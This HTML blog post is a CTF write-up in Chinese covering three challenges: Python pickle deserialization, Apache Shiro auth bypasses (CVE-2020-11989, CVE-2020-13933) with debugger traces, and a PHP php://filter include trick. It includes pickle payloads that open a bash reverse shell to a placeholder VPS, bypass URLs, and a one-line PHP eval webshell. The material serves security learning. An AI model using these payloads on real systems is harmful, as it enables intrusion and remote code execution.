&lt;p>限制的点在于&lt;u>&lt;a href="https://amiaaaz.github.io/2021/08/12/python-unserialize-notes-01-python/#--%E4%BB%85%E5%8F%AF%E4%BB%A5%E5%BC%95%E5%85%A5%E9%A2%98%E7%9B%AE%E4%B8%AD%E8%87%AA%E8%AE%BE%E7%9A%84%E6%A8%A1%E5%9D%97%E6%A8%A1%E5%9D%97%E5%90%8D%E4%B8%8D%E8%83%BD%E6%9C%89__%E7%AC%A6">只允许引入题目自设模块&amp;amp;限制模块中含下划线&lt;/a>&lt;/u>，那就直接变量覆盖，然后利用给出的&lt;code>eval()&lt;/code>弹shell就好了&lt;/p>
&lt;p>————另外这里的payload也可以是简短版本的弹sehll的payload 不唯一嘛&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;cconfig&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">notadmin&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0g0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">admin&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">yes&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">scconfig&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">backdoor&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">__import__(&amp;#34;os&amp;#34;).system(&amp;#34;bash -c &lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">exec bash -i &amp;amp;&amp;gt;/dev/tcp/you_vps_ip/port &amp;lt;&amp;amp;1&lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">&amp;#34;)&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">p3&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0g2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">(g3&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">tR.&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>一个需要注意的点是由于这里的反序列化入口是get传参，所以遇到+号会出问题，传进去之前要先urlencode(encode all special chars)&lt;/p>
&lt;p>————顺带练个手，搓一个不含&lt;code>b'R'&lt;/code>的opcode（用&lt;code>b'o'&lt;/code>代替）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;cconfig&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">notadmin&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0g0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">admin&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">yes&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">scconfig&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">backdoor&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">__import__(&amp;#34;os&amp;#34;).system(&amp;#34;bash -c &lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">exec bash -i &amp;amp;&amp;gt;/dev/tcp/you_vps_ip/port &amp;lt;&amp;amp;1&lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">&amp;#34;)&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">p3&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0(g2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">g3&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">o.&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>传参的时候记得再urlencode一下~~~&lt;/p>
&lt;p>————之前我的&lt;a href="https://amiaaaz.github.io/2021/08/12/python-unserialize-notes-01-python/">总结笔记&lt;/a>已经相当全面了 &lt;del>可以出CTF教科书了233333&lt;/del>&lt;/p>
&lt;h2 id="jack-shiro">Jack-Shiro&lt;/h2>
&lt;p>属于是原题了属于是属于是属于是烤烂了已经，参见 &lt;a href="https://www.zhaoj.in/read-6859.html#WEB1_javaweb">[红明谷CTF 2021] JavaWeb&lt;/a> | &lt;a href="https://www.huamang.xyz/index.php/archives/99/">[天翼杯 2021] jackson&lt;/a> | &lt;a href="https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-Java%E7%AF%87/#NPUCTF2020-EzShiro">[NPUCTF2020] EzShiro&lt;/a>&lt;del>（虽然我自己根本没发现 实在是做过的题太少了 java更是不会 我的&lt;/del>&lt;/p>
&lt;p>/login下有个登录，回显/json，返回的cookie有个rememberMe=deleteMe，可以知道是shiro&lt;/p>
&lt;p>访问/json，后面会带一堆get请求的参数，用/;/json绕过（cve-2020-11989）&lt;/p>
&lt;p>上工具&lt;a href="https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0">JNDI-Injection-Exploit&lt;/a>一把梭（问题出在我vps上没有java环境 端口转发又处了亿点点问题…… 所以没有带出来flag），是cve-2020-36188&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024041750586.png" alt="image-20211024041750586">&lt;/p>
&lt;p>哭哭&lt;/p>
&lt;p>还有个工具是 &lt;a href="https://github.com/Firebasky/LdapBypassJndi">LdapBypassJndi&lt;/a>，差不多的；下面是跟一跟涉及到的几个链子&lt;/p>
&lt;h3 id="cve-2020-11989">CVE-2020-11989&lt;/h3>
&lt;p>参考：&lt;a href="https://mp.weixin.qq.com/s/yb6Tb7zSTKKmBlcNVz0MBA">Apache Shiro权限绕过漏洞分析(CVE-2020-11989)&lt;/a> | &lt;a href="https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/">Apache Shiro 身份验证绕过漏洞 (CVE-2020-11989)&lt;/a>&lt;/p>
&lt;p>Apache Shiro是一个常用的java安全框架，在1.5.3之前版本中当Shiro与Spring动态控制器一起使用时（Spring框架中只用Shiro鉴权），如果直接访问/shiro/admin/page会302跳转要求登录，而访问/;shiro/admin/page即可绕过权限验证，访问/admin的信息&lt;/p>
&lt;h4 id="本地环境搭建复现">本地环境搭建&amp;amp;复现&lt;/h4>
&lt;p>有带佬直接写好的docker可以直接pull拿来用&lt;/p>
&lt;pre tabindex="0">&lt;code>docker pull jackey0/cve-2020-11989
docker run -p 8426:8080 &amp;lt;image&amp;gt; /bin/sh -c 'java -jar /springboot-shiro-0.0.1-SNAPSHOT.jar'
docker pull jackey0/cve-2020-13933
// docker start &amp;lt;container-id&amp;gt;
&lt;/code>&lt;/pre>&lt;p>或者下载&lt;a href="https://github.com/l3yx/springboot-shiro">l3yx/springboot-shiro&lt;/a>项目到本地编译为war包（或者也有编译好的&lt;a href="https://github.com/backlion/demo/blob/master/shiro.war">shiro.war&lt;/a>）之后手动放入tomcat下的webapps目录下运行。显然docker太香了！！！！！&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211025224051899.png" alt="image-20211025224051899">&lt;/p>
&lt;p>访问映射到外部的8426端口，环境搭建完毕&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211025224115269.png" alt="image-20211025224115269">&lt;/p>
&lt;p>post方式请求/doLogin页面，看到cookie中含rememberMe=deleteMe，确定为shiro&lt;/p>
&lt;p>访问/admin/page页面，302重定向至/login页面要求登录&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211025232735464.png" alt="image-20211025232735464">&lt;/p>
&lt;p>访问/;/admin/page页面，绕过鉴权，回显admin page&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211025232717422.png" alt="image-20211025232717422">&lt;/p>
&lt;h4 id="源码分析动调">源码分析&amp;amp;动调&lt;/h4>
&lt;p>先把jar包下载到在本地，导入idea&lt;/p>
&lt;pre tabindex="0">&lt;code>docker cp &amp;lt;container-id&amp;gt;:/springboot-shiro-0.0.1-SNAPSHOT.jar /home/name/t3mp/
&lt;/code>&lt;/pre>&lt;p>使用idea远程对docker中部署的springboot项目进行debug&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026033544920.png" alt="image-20211026033544920">&lt;/p>
&lt;pre tabindex="0">&lt;code>docker run -p 8426:8080 -p 8001:1456 3eefd8918689 /bin/sh -c 'java -jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=1456 /springboot-shiro-0.0.1-SNAPSHOT.jar'
&lt;/code>&lt;/pre>&lt;p>Shiro的权限校验是通过判断url的匹配来进行的，如果Shiro获取的url和web框架处理的url结果不一致时就造成了权限绕过；Shiro对于url的获取和匹配在&lt;code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain&lt;/code>中进行。&lt;/p>
&lt;p>以访问/;/admin/page为例，通过它的&lt;code>getPathWithinApplication()&lt;/code>得到的requestURI=&amp;quot;/&amp;quot;&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026105323534.png" alt="image-20211026105323534">&lt;/p>
&lt;p>跟入此函数的处理逻辑&lt;code>org.apache.shiro.web.util.WebUtils#getPathWithinApplication&lt;/code>，进入&lt;code>getRequestUri()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026113806371.png" alt="image-20211026113806371">&lt;/p>
&lt;p>我们可以看到在中间过程中uri=&amp;quot;/;/admin/page&amp;quot;，但是从上面我们可以知道经过&lt;code>normalize(decodeCleanUriString())&lt;/code>处理过后返回的requestRUI=&amp;quot;/&amp;quot;，跟入这个函数，它先是调用&lt;code>decodeRequestSrting()&lt;/code>，没有对结果产生什么影响，&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026114857281.png" alt="image-20211026114857281">&lt;/p>
&lt;p>而返回时的&lt;code>normalize()&lt;/code>会根据&amp;quot;;&amp;ldquo;进行url的截断处理，最终返回&amp;rdquo;/&amp;quot;&lt;/p>
&lt;p>回到开头的/;/admin/page请求，spring中处理url的函数在&lt;code>org.springframework.web.util.UrlPathHelper#getPathWithinServletMapping&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026115653673.png" alt="image-20211026115653673">&lt;/p>
&lt;p>它调用的是springframework中自己&lt;code>getPathWithinApplication()&lt;/code>，经过一番骚操作返回的是/admin/page&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026115916664.png" alt="image-20211026115916664">&lt;/p>
&lt;p>跟入&lt;code>getPathWitinApplication()&lt;/code>，先是调用&lt;code>getContextPath()&lt;/code>，返回&amp;quot;/&amp;quot;&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026120922475.png" alt="image-20211026120922475">&lt;/p>
&lt;p>然后是&lt;code>getRequestUri()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026121402778.png" alt="image-20211026121402778">&lt;/p>
&lt;p>同样，在最终return之前的uri=&amp;quot;/;/admin/page&amp;quot;，经过了一个&lt;code>decodeAndCleanUriString()&lt;/code>，根据ch=59也就是&amp;quot;;&amp;ldquo;符进行一个分割，使用&lt;code>removeSemicolonContentInternal()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026121749767.png" alt="image-20211026121749767">&lt;/p>
&lt;p>于是&amp;rdquo;;&amp;ldquo;就不见了&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026122016422.png" alt="image-20211026122016422">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026122121074.png" alt="image-20211026122121074">&lt;/p>
&lt;p>然后返回&amp;rdquo;/admin/page&amp;quot;给&lt;code>getPathWithinApplication()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026122204403.png" alt="image-20211026122204403">&lt;/p>
&lt;p>再传递给&lt;code>getPathWithinServletMapping()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026122355835.png" alt="image-20211026122355835">&lt;/p>
&lt;p>最终我们访问到的页面就是&amp;quot;/admin/page&amp;quot;了&lt;/p>
&lt;p>————总结一下就是当url在shiro和spring中的处理不一致，当进入应用时被认作是访问&amp;quot;/;/admin/page&amp;quot;，不属于我们最初配置的&amp;quot;/admin/*&amp;ldquo;权限路由，而进入shiro后却被截断处理，认作是&amp;rdquo;/admin/page&amp;quot;，属于权限路由中，最终做到权限绕过&lt;/p>
&lt;h3 id="cve-2020-13933">CVE-2020-13933&lt;/h3>
&lt;p>由于11989的修补并不完全，导致又又又被绕过产生了13933……&lt;/p>
&lt;h4 id="本地环境搭建复现-1">本地环境搭建&amp;amp;复现&lt;/h4>
&lt;p>参考：&lt;a href="https://www.anquanke.com/post/id/214964#h2-3">shiro &amp;lt; 1.6.0的认证绕过漏洞分析(CVE-2020-13933)&lt;/a>&lt;/p>
&lt;p>还是采用docker形式复现（我爱docker）这里直接就是远程调试的启动命令啦，跟上面的一样配置就好了（&lt;/p>
&lt;pre tabindex="0">&lt;code>docker pull jackey0/cve-2020-13933
docker run -p 8426:8080 -p 8001:1456 3eefd8918689 /bin/sh -c 'java -jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=1456 /springboot-shiro-0.0.1-SNAPSHOT.jar'
&lt;/code>&lt;/pre>&lt;p>访问/admin，报错页面且无302跳转；访问/login跳转到身份验证页面；访问/admin/%3bpage，无身份验证且返回admin page&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026171901636.png" alt="image-20211026171901636">&lt;/p>
&lt;h4 id="原理分析动调">原理分析&amp;amp;动调&lt;/h4>
&lt;p>还是导入jar包至idea，远程debug&lt;/p>
&lt;p>直接看看shiro1.6.0的补丁补到了什么地方，在github上查看&lt;a href="https://github.com/apache/shiro/compare/shiro-root-1.5.3...shiro-root-1.6.0">diff&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026175139677.png" alt="image-20211026175139677">&lt;/p>
&lt;p>增加了&lt;code>InvalidRequestFilter&lt;/code>类，有个&lt;code>isAccessAllowed()&lt;/code>函数，在全局上对分号、反斜杠、非ASCII码字符进行了过滤&lt;/p>
&lt;p>以访问/admin/%3bpage为例，url先由shiro解析，还是&lt;code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain&lt;/code>，依旧是调用&lt;code>getPathWithinApplication()&lt;/code>，执行后requestURI=&amp;quot;/admin/&amp;quot;&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026181015088.png" alt="image-20211026181015088">&lt;/p>
&lt;p>而之后进入springboot处理时，却变成了&amp;quot;/admin/;page&amp;quot;&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026181252374.png" alt="image-20211026181252374">&lt;/p>
&lt;p>再回到最初跟一下具体的调用链&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026182540363.png" alt="image-20211026182540363">&lt;/p>
&lt;p>在&lt;code>removeSemicolon()&lt;/code>处理前，uri=&amp;quot;/admin/;page&amp;quot;（经&lt;code>decodeAndUriString()&lt;/code>解码了）&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026182711164.png" alt="image-20211026182711164">&lt;/p>
&lt;p>处理后path=&amp;quot;/admin&amp;quot;，接着调用&lt;code>normalize()&lt;/code>函数变成&amp;quot;/admin&amp;quot;，传递给最初的&lt;code>getChain()&lt;/code>中的requestURI参数&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026183041350.png" alt="image-20211026183041350">&lt;/p>
&lt;p>之后被spring处理&lt;code>org.springframework.web.util.UrlPathHelper#getPathWithinServletMapping&lt;/code>，其中会调用&lt;code>getRequestUri()&lt;/code>，它会再次调用&lt;code>decodeAndCleanUriString()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026183542060.png" alt="image-20211026183542060">&lt;/p>
&lt;p>先&lt;code>removeSemicolonContent()&lt;/code>再&lt;code>decodeRequestString()&lt;/code>，那显然是怎么都去不掉&amp;quot;;&amp;ldquo;了，将&amp;rdquo;;page&amp;quot;看作一个整体&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026184529505.png" alt="image-20211026184529505">&lt;/p>
&lt;p>我们回过头去看这次的权限设置是怎么匹配url的，定位到&lt;code>org.syclover.srpingbootshiro.LoginController&lt;/code>和&lt;code>org.syclover.srpingbootshiro.ShiroConfig#shiroFilterFactoryBean&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026190414964.png" alt="image-20211026190414964">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026190401468.png" alt="image-20211026190401468">&lt;/p>
&lt;p>可以看到，对于&amp;quot;/admin/*&amp;ldquo;需要鉴权，&amp;quot;/admin/{name}&amp;ldquo;返回admin page，而对于&amp;rdquo;/admin/&amp;ldquo;却没有设置权限&lt;/p>
&lt;p>从上面的调试中我们知道shiro得到的是&amp;rdquo;/admin/&amp;quot;（先decode再去除&amp;rdquo;;&amp;quot;），被认作可以访问；而spring得到的是&amp;quot;/admin/;page&amp;quot;）先去除&amp;quot;;&amp;ldquo;再decode），与&amp;rdquo;/admin/{name}&amp;ldquo;的样式匹配，最后返回admin page~~（简直太完美了也~~&lt;/p>
&lt;h4 id="临时修复">*临时修复&lt;/h4>
&lt;p>（本地暂时还未复现&lt;/p>
&lt;pre tabindex="0">&lt;code>map.put(&amp;quot;/admin/**&amp;quot;, &amp;quot;authc&amp;quot;);
@GetMapping({&amp;quot;/admin/page&amp;quot;})
public String admin() {
return &amp;quot;admin page&amp;quot;;
}
&lt;/code>&lt;/pre>&lt;h3 id="cve-2020-36188">***CVE-2020-36188&lt;/h3>
&lt;p>&lt;code>ch.qos.logback.core.db.JNDIConnectionSource&lt;/code>&lt;/p>
&lt;p>可以参考 &lt;a href="https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-Java%E7%AF%87/#NPUCTF2020-EzShiro">https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-Java%E7%AF%87/#NPUCTF2020-EzShiro&lt;/a>，工具 &lt;a href="https://github.com/Firebasky/LdapBypassJndi">LdapBypassJndi&lt;/a> | &lt;a href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit&lt;/a>&lt;/p>
&lt;p>————由于我的java水平实在够呛，这里暂时先空着，等我学一学java 之后必定回来鞭尸&lt;/p>
&lt;h2 id="easyfilter">EasyFilter&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">ini_set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;open_basedir&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;./&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;action&amp;#39;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;action&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;w&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">mkdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./files/&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$content&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;c&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">$file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">bin2hex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">random_bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./files/&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$content&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;./files/&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">elseif&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;action&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">$r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">$file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;./files/&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$r&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">include&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;php://filter/resource=&lt;/span>&lt;span style="color:#d88200">$file&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>/?action=w&amp;amp;c=&amp;lt;?php @eval($_POST['wuhu']);?&amp;gt;
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>/?action=r&amp;amp;r=php://filter/read=convert.base64-decode/resource=/../../../../../files/f8b3731ac9
POST: wuhu=phpinfo();
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023214748589.png" alt="image-20211023214748589">&lt;/p>
&lt;h3 id="对于payload的底层代码分析">对于payload的底层代码分析&lt;/h3>
&lt;p>原理分析来自Guoke佬 我只是个会复现的铁沸物……&lt;/p>
&lt;p>首先下一份7.2.34的源码&lt;/p>
&lt;p>定位到包装器所在的文件位置/ext/standard/php_fopen_wrapper.c，178行起是php_stream_url_wrap_php()的代码&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024210116402.png" alt="image-20211024210116402">&lt;/p>
&lt;p>191行，先碰到&lt;code>php://&lt;/code>会执行&lt;code>path += 6&lt;/code>；之后接着349行会碰到&lt;code>filter/&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024210420398.png" alt="image-20211024210420398">&lt;/p>
&lt;p>没有mode，此时&lt;/p>
&lt;pre tabindex="0">&lt;code>path=filter/resource=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt
&lt;/code>&lt;/pre>&lt;p>357行执行strdup()，把path第6位之后的内容赋给pathdup指针上&lt;/p>
&lt;pre tabindex="0">&lt;code>pathdup=/resource=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt
&lt;/code>&lt;/pre>&lt;p>358行strstr()返回pathdup的指针中/resource=出现的位置，到365行的判断&lt;/p>
&lt;pre tabindex="0">&lt;code>p+10=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt
&lt;/code>&lt;/pre>&lt;p>372行的php_strtok_r()对pathdup+1的位置以'/&amp;lsquo;为标志进行分割&lt;/p>
&lt;pre tabindex="0">&lt;code>p=/resource=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt
&lt;/code>&lt;/pre>&lt;p>得到resource=，进373行的while循环，先是到378行的php_stream_apply_filter_list()，转至159行&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024230730886.png" alt="image-20211024230730886">&lt;/p>
